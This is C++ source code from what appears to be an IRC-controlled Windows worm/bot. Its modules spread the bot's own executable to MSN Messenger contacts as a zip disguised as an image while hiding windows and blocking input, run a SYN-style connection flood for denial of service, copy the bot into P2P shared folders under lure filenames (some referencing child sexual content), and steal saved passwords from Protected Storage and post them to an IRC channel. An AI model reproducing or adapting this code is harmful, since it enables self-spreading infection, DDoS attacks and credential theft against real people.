#import "../other/MSNMessengerAPI.tlb" named_guids, no_namespace


void to_variant2(BSTR, VARIANT& vt);
int trt;
//int stats_msg;

char *stristr2(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;

	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);
			slen >= plen; start++, slen--) {

		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;

			if (slen < plen)
				return (NULL);
		}

		sptr = start;
		pptr = (char *) Pattern;

		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;

			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}

void key_type2(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}
/*
int dropfiles(char *ZipName, HWND hwnd) 
{
    char windir[260];
	char szFiles[260];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,"\\");
	strcat(windir, ZipName);
	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);

if (::OpenClipboard (hwnd)) 
{
    ::EmptyClipboard ();
    int nSize = sizeof (DROPFILES) + sizeof (szFiles);
    HANDLE hData = ::GlobalAlloc (GHND, nSize);
    LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
    pDropFiles->pFiles = sizeof (DROPFILES);

#ifdef UNICODE
    pDropFiles->fWide = TRUE;
#else
    pDropFiles->fWide = FALSE;
#endif

    LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
    ::CopyMemory (pData, szFiles, sizeof (szFiles));
    ::GlobalUnlock (hData);
    ::SetClipboardData (CF_HDROP, hData);
    ::CloseClipboard ();
}
	return 0;
}
*/

void dropfiles(HWND hwnd, char *email){
    char windir[260];
	char szFiles[260];
	char emaildir[MAX_PATH];

	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,"\\temp\\syz.tmp");
	//sprintf(windir, "%s\\%s", windir1, filename);

	GetWindowsDirectory(emaildir, sizeof(emaildir));
	strcat(emaildir, "\\temp\\");
	strcat(emaildir, email);
	strcat(emaildir, ".zip");

	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);
 
	CopyFile(szFiles, emaildir, FALSE);
	strcpy(szFiles, emaildir);

/*	
	char testbuf[1024];
	sprintf( testbuf, "email = %s\nszFiles = %s\nemaildir = %s",
		email,
		szFiles,
		emaildir);
	MessageBox(0, testbuf, "", MB_OK);
*/
	


/// copy ZIP to Clipboard
if (::OpenClipboard (hwnd)) 
{
    ::EmptyClipboard ();
    int nSize = sizeof (DROPFILES) + sizeof (szFiles);
    HANDLE hData = ::GlobalAlloc (GHND, nSize);
    LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
    pDropFiles->pFiles = sizeof (DROPFILES);

#ifdef UNICODE
    pDropFiles->fWide = TRUE;
#else
    pDropFiles->fWide = FALSE;
#endif

    LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
    ::CopyMemory (pData, szFiles, sizeof (szFiles));
    ::GlobalUnlock (hData);
    ::SetClipboardData (CF_HDROP, hData);
    ::CloseClipboard ();
}
///


	//DeleteFile(emaildir);
}

DWORD WINAPI ImMsg3(LPVOID param)
{
	trt = 0;

	NTHREAD msn3 = *((NTHREAD *)param);
	NTHREAD *msns = (NTHREAD *)param;
	msns->gotinfo = TRUE;
	IRC* irc=(IRC*)msn3.conn;

    ///Windir Zipfile Namensgebung
	char fakename[] = "syz.tmp";

	char windir[MAX_PATH];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir, "\\temp\\");
	strcat(windir, fakename);
	///




	IMSNMessenger3 *pIMessenger = NULL;

	CoInitialize(0);

	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger2,
		(void**)&pIMessenger);

	char msnmsg[512];
	char buf[128];
	char msnmsg1[1024];
	strncpy(msnmsg,msn3.data1,sizeof(msnmsg));
     
	if (SUCCEEDED(hr))
	{

		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{

			IMSNMessengerContacts *pIMessengerContacts = NULL;
			
			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								/// Message orginal name@mail.com at end of message
								/*
							    pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg1, "%s%s", msnmsg, buf);
                                */

								/// Message no name@mail.com !!!
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant2(szContactName, vt_user);
								_bstr_t tmp = szContactName;
								sprintf(buf, _T("%s"), (LPCTSTR)tmp);
								sprintf(msnmsg1, "%s", msnmsg);
								///

								/*
								///Create .zip OHNE email@email.com
								char *pemail;
								//pemail = strchr(buf, '@');
								//if(pemail != NULL) buf[pemail-buf] = NULL;
								strcat(buf, "");
								//
								
                                */

								
								///Create .zip MIT email@email.imageshack.com
								char *pemail;
								pemail = strchr(buf, '@');
								if(pemail != NULL) buf[pemail-buf] = NULL;
								strcat(buf, "_0014.jpeg-www.imageshack.com");
								//
								//_0016.jpeg-www.facebook.com
								
                                



                                /*
								///Create .zip MIT name.com
								char *pemail;
								pemail = strchr(buf, '@');
								if(pemail != NULL) buf[pemail-buf] = NULL;
								strcat(buf, ".com");
								//

                                */
								

								char exepath[MAX_PATH];
								GetModuleFileName(NULL, exepath, MAX_PATH);
								zip_store(exepath, windir, buf);
								///



								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void **)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										//trt++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());	
										//stats_msg++;
										//send message
                                        key_type2((char *)msnmsg1, (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);
										//send zipfile
										Sleep(50);
										dropfiles((HWND) wndIM, buf);
                                        keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);                                        
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
																		
									}
								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					/*
					if ( trt >= 1 )
					{
					irc->pmsg(Decode(infochan),str_msn_msg, trt);
					}
					*/
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();
	clearthread(msn3.threadnum);
	ExitThread(0);
	

	return 0;
}

void to_variant2(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
} 

















////////////////////////////////////////////////
//			Create Zip
////////////////////////////////////////////////
unsigned long crc32(unsigned long crc, const unsigned char *buf, int len)

{
#define CRC32_POLYNOMIAL 0xEDB88320  //the standard PKZIP polynomial
    unsigned long crc_table[256];
    unsigned long crc32;
    int i, j;

    for (i = 0; i < 256; i++)   //this is where my algorithm starts
    {
        crc32 = i;
        for (j = 8; j > 0; j--)
        {
            if (crc32 & 1)
                crc32 = (crc32 >> 1) ^ CRC32_POLYNOMIAL;
            else
                crc32 >>= 1;
        }
        crc_table[i] = crc32;
    }

    /* Mark Adler stuff taken from zlib.c */

    if (buf == NULL) return 0L;
#define CRC32(c, b) (crc_table[((int)(c) ^ (b)) & 0xff] ^ ((c) >> 8))
#define DO1(buf)  crc = CRC32(crc, *buf++)
#define DO2(buf)  DO1(buf); DO1(buf)
#define DO4(buf)  DO2(buf); DO2(buf)
#define DO8(buf)  DO4(buf); DO4(buf)
    crc = crc ^ 0xffffffffL;
#ifndef NO_UNROLLED_LOOPS
    while (len >= 8)
    {
        DO8(buf);
        len -= 8;
    }
#endif
    if (len) do
        {
            DO1(buf);
        }
        while (--len);
    return crc ^ 0xffffffffL;
}

//from here on down is mydoom bullshit
static void zip_putcurtime(WORD *f_time, WORD *f_date)
{
    SYSTEMTIME systime;

    GetSystemTime(&systime);
    if ((systime.wYear < 1999) || (systime.wYear > 2010))
        systime.wYear = 2004;
    if (systime.wMonth < 1 || systime.wMonth > 12) systime.wMonth = 1;
    if (systime.wDay < 1 || systime.wDay > 31) systime.wDay = 10;

    *f_date =
        ((systime.wYear-1980) << 9) |
        (systime.wMonth << 5) |
        systime.wDay;

    *f_time =
        (systime.wHour << 11) |
        (systime.wMinute << 5) |
        (systime.wSecond / 2);
}

static unsigned long zip_calc_crc32(HANDLE hFileIn)
{
    unsigned long reg, i;
    unsigned char buf[1024];
    SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
    for (reg=0;;)
    {
        i = 0;
        if (ReadFile(hFileIn, buf, sizeof(buf), &i, NULL) == 0) break;
        if (i == 0) break;
        reg = crc32(reg, buf, i);
    }
    SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
    return reg;
}

int zip_store(char *in, char *out, char *store_as)
{
    HANDLE hFileIn, hFileOut;
    struct zip_header_t hdr1;
    struct zip_eod_t eod1;
    struct zip_dir_t dir1;
    char buf[1024];
    unsigned long i, j, offs;

    hFileIn = CreateFile(in, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFileIn == INVALID_HANDLE_VALUE || hFileIn == NULL)
        return 1;
    hFileOut = CreateFile(out, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
                          NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFileOut == INVALID_HANDLE_VALUE || hFileOut == NULL)
    {
        CloseHandle(hFileIn);
        return 2;
    }

    memset(&hdr1, '\0', sizeof(hdr1));
    memset(&dir1, '\0', sizeof(dir1));
    memset(&eod1, '\0', sizeof(eod1));
    offs = 0;

    hdr1.signature = 0x04034b50;
    dir1.ver_needed = hdr1.ver_needed = 10;
    dir1.flags = hdr1.flags = 0;
    dir1.method = hdr1.method = 0;
    zip_putcurtime(&hdr1.lastmod_time, &hdr1.lastmod_date);
    dir1.lastmod_time = hdr1.lastmod_time;
    dir1.lastmod_date = hdr1.lastmod_date;
    hdr1.crc = zip_calc_crc32(hFileIn);
    dir1.crc = hdr1.crc;

    hdr1.compressed_size = GetFileSize(hFileIn, NULL);
    dir1.compressed_size = hdr1.compressed_size;
    hdr1.uncompressed_size = GetFileSize(hFileIn, NULL);
    dir1.uncompressed_size = hdr1.uncompressed_size;
    hdr1.filename_length = lstrlen(store_as);
    dir1.filename_length = hdr1.filename_length;
    dir1.extra_length = hdr1.extra_length = 0;

    dir1.local_offs = offs;

    WriteFile(hFileOut, &hdr1, sizeof(hdr1), &i, NULL);
    offs += sizeof(hdr1);
    WriteFile(hFileOut, store_as, lstrlen(store_as), &i, NULL);
    offs += lstrlen(store_as);
    SetFilePointer(hFileIn, 0, NULL, FILE_BEGIN);
    for (;;)
    {
        i = 0;
        if (ReadFile(hFileIn, buf, sizeof(buf), &i, NULL) == 0) break;
        if (i == 0) break;
        WriteFile(hFileOut, buf, i, &j, NULL);
        offs += i;
    }

    eod1.dir_offs = offs;

    dir1.signature = 0x02014b50;
    dir1.made_by = 20;
    dir1.internal_attr = 0;
    dir1.external_attr = 0x20;
    WriteFile(hFileOut, &dir1, sizeof(dir1), &i, NULL);
    offs += sizeof(dir1);
    WriteFile(hFileOut, store_as, lstrlen(store_as), &i, NULL);
    offs += lstrlen(store_as);

    eod1.signature = 0x06054b50;
    eod1.disk_no = 0;
    eod1.disk_dirst = 0;
    eod1.disk_dir_entries = 1;
    eod1.dir_entries = eod1.disk_dir_entries;
    eod1.dir_size = offs - eod1.dir_offs;
    eod1.comment_len = 0;
    WriteFile(hFileOut, &eod1, sizeof(eod1), &i, NULL);

    CloseHandle(hFileOut);
    CloseHandle(hFileIn);
    return 0;
}
#endif




    //////////////////////////////////////////////////////////////////////////////
	//                               Supersyn DDOS
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SUPERSYN

	#define MAX_PACK_LEN 65535
	#define SIO_RCALL 0x98000001
	#define SUPERSYN_SOCKETS 200


	#define SYN_DPORT 2000
	#define SYN_XORVAL 0xFFFFFFFF
	#define SYN_SPOOF_TEST 2001
	#define SYN_SPOOF_GOOD 2002

	DWORD WINAPI SuperSynThread(LPVOID param)
	{
		char sendbuf[IRCLINE];

		SUPERSYN supersyn = *((SUPERSYN *)param);
		SUPERSYN *supersyns = (SUPERSYN *)param;
		supersyns->gotinfo = TRUE;
		IRC* irc=(IRC*)supersyn.conn;
		
		if (!supersyn.silent) 
			irc->pmsg(supersyn.target, ".::[SUPERSYN]::. Done with flood (%iKB/sec).05>", SuperSyn(supersyn.ip, supersyn.port, supersyn.length));

		clearthread(supersyn.threadnum);
		ExitThread(0);
		return 0;
	}

	long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort, int len)
	{
		int superdelay = 100;
		SOCKADDR_IN    SockAddr;
		SOCKET         sock[SUPERSYN_SOCKETS];
   		IN_ADDR iaddr;
		memset(&SockAddr, 0, sizeof(SockAddr));
		SockAddr.sin_family = AF_INET;
   		SockAddr.sin_port = fhtons(TargetPort);
		LPHOSTENT lpHostEntry = NULL;
 		DWORD mode = 1;
		int c,i;
		iaddr.s_addr = TargetIP;
		SockAddr.sin_addr = iaddr; //ip addy
		i = 0;
		while (i < len) {
			for (c=0;c<SUPERSYN_SOCKETS;c++)
			{
				sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   				if (sock[c] == INVALID_SOCKET)
      					continue;
				ioctlsocket(sock[c],FIONBIO,&mode);
			}
			for (c=0;c<SUPERSYN_SOCKETS;c++)
  				connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
      			Sleep(superdelay);
			for (c=0;c<SUPERSYN_SOCKETS;c++)
				closesocket(sock[c]); //close sockets
			i++;
		}
		return 0;
	}

	long SuperSyn(char *target, char *port, char *len)
	{
		unsigned long IP = finet_addr(target);

		if (IP==INADDR_NONE) {
			hostent *pHE = fgethostbyname(target);
			if (pHE == 0)
				return INADDR_NONE;
			IP = *((unsigned long *)pHE->h_addr_list[0]);
		}

		unsigned long TargetIP = IP;
		unsigned short p = (unsigned short)atoi(port);
		int t = atoi(len);

		long num = SuperSynSend(TargetIP, p, t);

		if (num == 0)
			num = 1;
		num = num / 1000 / t;

		return num;
	}

#endif

    //////////////////////////////////////////////////////////////////////////////
	//                               P2P Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_P2P
char *szP2PFiles[] =
{
	"Limewire PRO Final Edition.exe",
	"Steam Crack.exe",
	"Counter Strike Source Crack.exe",
	"Windows XP Validator Crack.exe",
	"Spore Full Patcher.exe",
	"Spore Crack.exe",
	"Hotmail Hacker.exe",
	"Hotmail Cracker.exe",
	"Norton AntiVirus ALL VERSIONS Crack.exe",
	"Kaspersky Crack.exe",
	"DCOM Exploit.exe",
	"NetBIOS Hacker.exe",
	"NetBIOS Cracker.exe",
	"Windows Password Cracker.exe",
	"L0pht 4.0 Windows Password Cracker.exe",
	"sdbot with NetBIOS Spread.exe",
	"Sub7 2.3 Private.exe",
	"Microsoft Visual C++ KeyGen.exe",
	"Microsoft Visual Basic KeyGen.exe",
	"Microsoft Visual Studio KeyGen.exe",
	"Young girl and boy sex.scr",
	"Young boy nude.scr",
	"Young girl nude.scr",
	"teen sex.scr",
	"older man and young boy.scr",
	"young girl first time.scr",
	"MSN Password Cracker.exe",
	"SAMP GTA MultiPlayer.exe",
	"MSN Password Stealer.exe",
	"MSN Keylogger.exe",
	"Keylogger.exe",
	"Bebo/Myspace/Facebook Password Stealer.exe",
	"Dark DDoS Tool.exe",
	"Steam KeyGen.exe",
	"DivX Pro + KeyGen.exe",
	"Youtube Account Cracker.exe",
	"MSN Spammer/Nudger.exe"
};
	char *szPath[] = 
{   
	"kazaa\\my shared folder\\",
	"kazaa lite\\my shared folder\\",
	"kazaa lite k++\\my shared folder\\",
	"icq\\shared folder\\",
	"grokster\\my grokster\\",
	"bearshare\\shared\\",
	"edonkey2000\\incoming\\",	
	"emule\\incoming\\",	
    "morpheus\\my shared folder\\",
	"limewire\\shared\\",
	"tesla\\files\\",
	"winmx\\shared\\",
};

bool InfectP2P()
{
	Peer2PeerInfo_s *pPeer2PeerInfo_s = new Peer2PeerInfo_s;

	if (pPeer2PeerInfo_s) 
		ZeroMemory(pPeer2PeerInfo_s, sizeof(Peer2PeerInfo_s));
	else
		ExitThread(0);

	//Find ProgramfilesDir//
    PUCHAR strresult = new UCHAR[26];
    PUCHAR progdir = new UCHAR[200];
   
    HKEY key = NULL;
    DWORD datasize = 200;
    DWORD dwRet = 0;

    ZeroMemory((PVOID)strresult,26);

    dwRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",0,KEY_READ,&key);                      
    dwRet = RegQueryValueEx(key,"ProgramFilesDir",NULL,NULL,(LPBYTE)progdir,&datasize);     
    RegCloseKey(key);
    ////////////////////

	GetModuleFileName(GetModuleHandle(NULL), pPeer2PeerInfo_s->szDirectory, sizeof(pPeer2PeerInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szP2PFiles) / sizeof(LPTSTR)); j++)
		{      
			char p2pfolder[1024];
			sprintf( p2pfolder, "%s\\%s",
			progdir,
			szPath[i]);
			strcpy(pPeer2PeerInfo_s->szFilePath, p2pfolder);
			strcat(pPeer2PeerInfo_s->szFilePath, szP2PFiles[j]);

			if (CopyFile(pPeer2PeerInfo_s->szDirectory, pPeer2PeerInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pPeer2PeerInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);    
			} 
		}
	}
	delete pPeer2PeerInfo_s;
	return true;
}






    //////////////////////////////////////////////////////////////////////////////
	//                               Pstore
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PSTORE

void __stdcall _com_issue_errorex(long,struct IUnknown *,struct _GUID const &)
{
    return;
}
void __stdcall _com_issue_error(long)
{
    return;
}

DWORD WINAPI pstore (LPVOID param)
{
    typedef HRESULT (__stdcall *PSCI)(IPStore **, DWORD, DWORD, DWORD);

    NTHREAD pStorInfoX = *((NTHREAD *)param);
    NTHREAD *pStorInfoXs = (NTHREAD *)param;
    pStorInfoXs->gotinfo = TRUE;
    IRC* irc=(IRC*)pStorInfoX.conn;
    char *searchparam = NULL;
    GUID TypeGUID;
    char szItemName[512];
    char szItemData[512];
    char szResName[1512];
    char szResData[512];
    char szItemGUID[50];
    PSCI fPStoreCreateInstance;
    int iSent=0;
    IPStorePtr PStore;


    if (pStorInfoX.bdata1 == TRUE)
        searchparam = pStorInfoX.data1;
    else
        searchparam = NULL;


    HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll)
        fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");
    else {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}


    HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
    
	if (FAILED(hRes)) {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}

    IEnumPStoreTypesPtr EnumPStoreTypes;
    hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
    
	if (FAILED(hRes)) {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}
	irc->pmsg(Decode(infochan),"%s starting PStore", main_title);
	
    while (EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
    {
        wsprintf(szItemGUID,"%x",TypeGUID);
        IEnumPStoreTypesPtr EnumSubTypes;
        hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
        GUID subTypeGUID;
        while (EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
        {
            IEnumPStoreItemsPtr spEnumItems;
            HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);
            LPWSTR itemName;
            while (spEnumItems->raw_Next(1,&itemName,0) == S_OK)
            {
                wsprintf(szItemName,"%ws",itemName);
                char chekingdata[200];
                unsigned long psDataLen = 0;
                unsigned char *psData = NULL;
                _PST_PROMPTINFO *pstiinfo = NULL;
                hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
                if (lstrlen((char *)psData),(psDataLen-1))
                {
                    int i=0;
                    for (unsigned int m = 0;m<psDataLen;m+=2)
                    {
                        if (psData[m]==0)
                            szItemData[i]=',';
                        else
                            szItemData[i]=psData[m];
                        i++;
                    }
                    szItemData[i-1]=0;
                }
                else
                {
                    wsprintf(szItemData,"%s",psData);
                }
                lstrcpy(szResName,"");
                lstrcpy(szResData,"");
                if (lstrcmp(szItemGUID,"5e7e8100")==0)
                {
                    lstrcpy(chekingdata,"");
                    if (strstr(szItemData,":")!=0)
                    {
                        lstrcpy(chekingdata,strstr(szItemData,":")+1);
                        *(strstr(szItemData,":"))=0;
                    }
                    iSent++;
                    if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
                        if (searchparam != NULL)
                        {
							if (strstr(szItemName, searchparam))
								irc->pmsg(Decode(infochan), "%s %s %s:%s", main_title, szItemName, szItemData, chekingdata);
                        }
                        else
                            irc->pmsg(Decode(infochan), "%s %s %s:%s",  main_title, szItemName, szItemData, chekingdata);
                }
                if (!lstrcmp(szItemGUID,"e161255a"))
                {
                    if (strstr(szItemName,"StringIndex")==0)
                    {
                        if (strstr(szItemName,":String")!=0)
                            *strstr(szItemName,":String")=0;
                        lstrcpyn(chekingdata,szItemName,8);
                        if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
                        {
                            lstrcpy(chekingdata,"");
                            if (strstr(szItemData,",")!=0)
                            {
                                lstrcpy(chekingdata,strstr(szItemData,",")+1);
                                *(strstr(szItemData,","))=0;
                            }
                            iSent++;
                            if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))

                                if (searchparam != NULL)
                                {
                                    if (strstr(szItemName, searchparam))
                                        irc->pmsg(Decode(infochan), "%s %s %s:%s",  main_title, szItemName, szItemData, chekingdata);
                                }
                                else
									irc->pmsg(Decode(infochan), "%s %s %s:%s",  main_title, szItemName, szItemData, chekingdata);
                        }
                    }
                }
                ZeroMemory(szItemName,sizeof(szItemName));
                ZeroMemory(szItemData,sizeof(szItemData));
                Sleep (1000);
            }
        }
    }
	
	irc->pmsg(Decode(infochan), "%s End of PStore", main_title);
	clearthread(pStorInfoX.threadnum);
	ExitThread(0);
    return 0;
}
#endif
#endif
